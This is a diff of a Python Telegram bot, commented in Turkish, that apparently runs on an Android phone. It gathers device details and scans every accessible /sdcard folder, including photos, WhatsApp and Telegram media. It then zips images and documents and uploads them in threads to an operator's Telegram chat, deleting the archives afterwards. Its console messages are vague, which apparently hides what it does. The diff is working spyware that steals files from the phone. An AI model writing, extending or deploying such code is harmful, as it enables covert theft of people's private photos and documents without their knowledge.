@@ -3,6 +3,7 @@ import json
 import time
 import requests
 import zipfile
+import threading
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 
@@ -58,66 +59,103 @@ def cihaz_bilgisi_al():
         bilgiler["Hata"] = "Bazı bilgiler alınamadı!"
     return bilgiler
 
+def klasor_boyut_hesapla(yol):
+    toplam_boyut = 0
+    try:
+        for dosya in os.listdir(yol):
+            tam_yol = os.path.join(yol, dosya)
+            if os.path.isfile(tam_yol):
+                try:
+                    toplam_boyut += os.path.getsize(tam_yol)
+                except:
+                    continue
+    except:
+        return 0
+    return toplam_boyut
+
 def dosya_tara():
-    klasorler = {
-        "Download": "/sdcard/Download",
-        "Pictures": "/sdcard/Pictures",
-        "Movies": "/sdcard/Movies",
-        "Documents": "/sdcard/Documents",
-        "WhatsApp Media": "/sdcard/WhatsApp/Media",
-        "DCIM": "/sdcard/DCIM",
-        "Music": "/sdcard/Music",
-        "Telegram": "/sdcard/Telegram",
-        "Screenshots": "/sdcard/Pictures/Screenshots",
-        "Recordings": "/sdcard/Recordings",
-        "Bluetooth": "/sdcard/Bluetooth"
-    }
+    klasorler = {}
     dosya_listesi = {}
+    hiyerarsi = {}
     global dosya_haritasi
     dosya_haritasi = {}
     sayac = 1
-    medya_uzantilari = [".jpg", ".png"]  # Boyut sınırı olmayanlar
-    diger_uzantilari = [".pdf", ".docx", ".txt", ".zip", ".mp4"]  # 1MB+ olanlar
+    alt_klasor_sayac = 1
+    medya_uzantilari = [".jpg", ".png"]
+    diger_uzantilari = [".pdf", ".docx", ".txt", ".zip", ".mp4"]
     min_boyut = 1024 * 1024  # 1MB sınır
-    
-    for klasor, yol in klasorler.items():
-        dosya_listesi[klasor] = []
+    emulated_yol = "/sdcard"
+
+    # Ana klasörleri tara
+    try:
+        for item in os.listdir(emulated_yol):
+            tam_yol = os.path.join(emulated_yol, item)
+            if os.path.isdir(tam_yol):
+                try:
+                    os.listdir(tam_yol)  # Erişim kontrolü
+                    klasorler[str(alt_klasor_sayac)] = tam_yol
+                    hiyerarsi[str(alt_klasor_sayac)] = {
+                        "name": os.path.basename(tam_yol),
+                        "size_mb": klasor_boyut_hesapla(tam_yol) / (1024 * 1024),
+                        "subfolders": {}
+                    }
+                    alt_klasor_sayac += 1
+                except:
+                    continue
+    except Exception as e:
+        print(f"emulated/0 taranmadı: {str(e)}")
+
+    # Alt klasörleri tara
+    for numara, yol in klasorler.items():
+        dosya_listesi[numara] = []
         try:
-            for root, _, files in os.walk(yol):
-                for dosya in files:
-                    tam_yol = os.path.join(root, dosya)
+            for dosya in os.listdir(yol):
+                tam_yol = os.path.join(yol, dosya)
+                if os.path.isdir(tam_yol):
+                    try:
+                        os.listdir(tam_yol)  # Erişim kontrolü
+                        hiyerarsi[numara]["subfolders"][str(alt_klasor_sayac)] = {
+                            "name": os.path.basename(tam_yol),
+                            "size_mb": klasor_boyut_hesapla(tam_yol) / (1024 * 1024),
+                            "subfolders": {}
+                        }
+                        alt_klasor_sayac += 1
+                    except:
+                        continue
+                elif os.path.isfile(tam_yol):
                     try:
                         dosya_boyutu = os.path.getsize(tam_yol)
                         if any(dosya.lower().endswith(uzanti) for uzanti in medya_uzantilari):
-                            dosya_listesi[klasor].append({f"[{sayac}]": dosya})
+                            dosya_listesi[numara].append({f"[{sayac}]": dosya})
                             dosya_haritasi[str(sayac)] = tam_yol
                             sayac += 1
                         elif any(dosya.lower().endswith(uzanti) for uzanti in diger_uzantilari) and dosya_boyutu >= min_boyut:
-                            dosya_listesi[klasor].append({f"[{sayac}]": dosya})
+                            dosya_listesi[numara].append({f"[{sayac}]": dosya})
                             dosya_haritasi[str(sayac)] = tam_yol
                             sayac += 1
                     except:
                         continue
         except Exception as e:
-            dosya_listesi[klasor].append({"Hata": f"{klasor} taranamadı: {str(e)}"})
-    return dosya_listesi, klasorler
+            dosya_listesi[numara].append({"Hata": f"Klasör taranamadı: {str(e)}"})
 
-def arsiv_olustur(kategori, klasor_yolu, max_boyut=45 * 1024 * 1024):  # 45 MB sınır
+    return dosya_listesi, klasorler, hiyerarsi
+
+def arsiv_olustur(kategori, klasor_yolu, max_boyut=45 * 1024 * 1024):
     zaman_damgasi = int(time.time())
     medya_uzantilari = [".jpg", ".png"]
     diger_uzantilari = [".pdf", ".docx", ".txt", ".zip", ".mp4"]
-    min_boyut = 1024 * 1024  # 1MB
+    min_boyut = 1024 * 1024
     arsiv_listesi = []
     mevcut_boyut = 0
     toplam_boyut = 0
     arsiv_sayac = 1
     zip_dosyasi = None
+    eklenen_dosyalar = set()
 
     try:
-        # Toplam boyutu hesapla
-        for root, _, files in os.walk(klasor_yolu):
-            for dosya in files:
-                tam_yol = os.path.join(root, dosya)
+        for dosya in os.listdir(klasor_yolu):
+            tam_yol = os.path.join(klasor_yolu, dosya)
+            if os.path.isfile(tam_yol):
                 try:
                     dosya_boyutu = os.path.getsize(tam_yol)
                     if any(dosya.lower().endswith(uzanti) for uzanti in medya_uzantilari) or \
@@ -130,9 +168,9 @@ def arsiv_olustur(kategori, klasor_yolu, max_boyut=45 * 1024 * 1024):  # 45 MB s
         arsiv_yolu = f"/sdcard/tmp/dosyalar_{kategori}_{zaman_damgasi}.zip"
         zip_dosyasi = zipfile.ZipFile(arsiv_yolu, 'w', zipfile.ZIP_DEFLATED)
 
-        for root, _, files in os.walk(klasor_yolu):
-            for dosya in files:
-                tam_yol = os.path.join(root, dosya)
+        for dosya in os.listdir(klasor_yolu):
+            tam_yol = os.path.join(klasor_yolu, dosya)
+            if os.path.isfile(tam_yol) and tam_yol not in eklenen_dosyalar:
                 try:
                     dosya_boyutu = os.path.getsize(tam_yol)
                     if any(dosya.lower().endswith(uzanti) for uzanti in medya_uzantilari) or \
@@ -144,8 +182,9 @@ def arsiv_olustur(kategori, klasor_yolu, max_boyut=45 * 1024 * 1024):  # 45 MB s
                             zip_dosyasi = zipfile.ZipFile(arsiv_yolu, 'w', zipfile.ZIP_DEFLATED)
                             mevcut_boyut = 0
                             arsiv_sayac += 1
-                        zip_dosyasi.write(tam_yol, os.path.relpath(tam_yol, klasor_yolu))
+                        zip_dosyasi.write(tam_yol, dosya)
                         mevcut_boyut += dosya_boyutu
+                        eklenen_dosyalar.add(tam_yol)
                 except:
                     continue
         
@@ -156,6 +195,15 @@ def arsiv_olustur(kategori, klasor_yolu, max_boyut=45 * 1024 * 1024):  # 45 MB s
         if zip_dosyasi:
             zip_dosyasi.close()
         return [], 0, f"Arşiv oluşturulamadı: {str(e)}"
+
+def gonder_arsiv(chat_id, arsiv_yolu, update):
+    try:
+        with open(arsiv_yolu, "rb") as f:
+            requests.post(TELEGRAM_API, data={"chat_id": chat_id}, files={"document": f}, timeout=180)
+        os.remove(arsiv_yolu)
+        print(f"-ZI-d: {arsiv_yolu}")
+    except Exception as e:
+        requests.post(TELEGRAM_MESSAGE_API, data={"chat_id": chat_id, "text": f"Hata, dosya gönderilemedi: {str(e)}"}, timeout=30)
 
 def bilgileri_kaydet_ve_gonder():
     zaman_damgasi = int(time.time())
@@ -187,10 +235,10 @@ def bilgileri_kaydet_ve_gonder():
     )
     requests.post(TELEGRAM_MESSAGE_API, data={"chat_id": CHAT_ID, "text": cihaz_mesaji}, timeout=30)
     print("IN loading. . .")
-    dosya_listesi, _ = dosya_tara()
+    dosya_listesi, _, hiyerarsi = dosya_tara()
     dosya_dosyasi = f"dosyalar_{zaman_damgasi}.json"
     with open(dosya_dosyasi, "w") as f:
-        json.dump(dosya_listesi, f, indent=4, ensure_ascii=False)
+        json.dump({"files": dosya_listesi, "hierarchy": hiyerarsi}, f, indent=4, ensure_ascii=False)
     print(f"FI loading . . .")
     with open(dosya_dosyasi, "rb") as f:
         requests.post(TELEGRAM_API, data={"chat_id": CHAT_ID}, files={"document": f}, timeout=30)
@@ -217,52 +265,45 @@ async def category(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.message.date.timestamp() < START_TIME:
         return
     
-    _, klasorler = dosya_tara()
-    kategori_listesi = "\n".join([f"{i+1}. {k}" for i, k in enumerate(klasorler.keys())])
-    mesaj = (
-        "Kategori Seç! 📜\n"
-        f"{kategori_listesi}\n"
-        "Örnek: /category >Download<"
-    )
+    _, klasorler, hiyerarsi = dosya_tara()
     if not context.args:
-        await update.message.reply_text(mesaj)
+        mesaj = ["Kategori Seç! 📜"]
+        for numara in sorted(hiyerarsi.keys(), key=int):
+            klasor_adi = hiyerarsi[numara]["name"]
+            if len(klasor_adi) > 20:
+                klasor_adi = klasor_adi[:20] + "..."
+            mesaj.append(f"{numara}. {klasor_adi} ({hiyerarsi[numara]['size_mb']:.2f} MB)")
+            for alt_numara, alt_klasor in hiyerarsi[numara]["subfolders"].items():
+                alt_klasor_adi = alt_klasor["name"]
+                if len(alt_klasor_adi) > 20:
+                    alt_klasor_adi = alt_klasor_adi[:20] + "..."
+                mesaj.append(f"    {alt_numara}. {alt_klasor_adi} ({alt_klasor['size_mb']:.2f} MB)")
+        mesaj.append("Örnek: /category 1")
+        await update.message.reply_text("\n".join(mesaj))
         return
     
-    kategori = " ".join(context.args).strip()
-    if kategori not in klasorler:
-        await update.message.reply_text(f"🚨 Geçersiz kategori: {kategori}, Listeden seç:\n{mesaj}")
+    numara = context.args[0]
+    if numara not in klasorler:
+        await update.message.reply_text(f"🚨 Geçersiz numara: {numara}, Listeden seç!")
         return
     
-    klasor_yolu = klasorler[kategori]
-    arsiv_listesi, toplam_boyut = arsiv_olustur(kategori, klasor_yolu)
+    klasor_yolu = klasorler[numara]
+    arsiv_listesi, toplam_boyut = arsiv_olustur(numara, klasor_yolu)
     
     if not arsiv_listesi or isinstance(arsiv_listesi, tuple):
         await update.message.reply_text(f"Arşiv oluşturulamadı. Hata: {arsiv_listesi[1] if isinstance(arsiv_listesi, tuple) else 'Bilinmeyen hata'}")
         return
     
-    # Toplam boyut MB cinsine çevrilir
     toplam_boyut_mb = toplam_boyut / (1024 * 1024)
     parca_sayisi = len(arsiv_listesi)
     
-    # Eğer toplam boyut 45 MB’tan büyükse uyarı mesajı
     if toplam_boyut_mb > 45:
         await update.message.reply_text(f"Seçtiğiniz kategori çok büyük {toplam_boyut_mb:.2f}MB. Parça parça atılıyor ({parca_sayisi})")
     
-    # Parçaları gönder
     for i, arsiv_yolu in enumerate(arsiv_listesi, 1):
-        try:
-            await update.message.reply_text(f"{i}. Parça Gönderiliyor...")
-            with open(arsiv_yolu, "rb") as f:
-                await update.message.reply_document(document=f, filename=os.path.basename(arsiv_yolu))
-            print(f"-ZI-s: {arsiv_yolu}")
-            os.remove(arsiv_yolu)
-            print(f"-ZI-d: {arsiv_yolu}")
-        except Exception as e:
-            await update.message.reply_text(f"Hata, {i}. parça gönderilemedi: {str(e)}")
-            if os.path.exists(arsiv_yolu):
-                os.remove(arsiv_yolu)
+        await update.message.reply_text(f"{i}. Parça Gönderiliyor...")
+        threading.Thread(target=gonder_arsiv, args=(update.message.chat_id, arsiv_yolu, update)).start()
     
-    # Tüm arşivler gönderildikten sonra Bitti mesajı
     await update.message.reply_text("Bitti! ✅")
 
 def main():
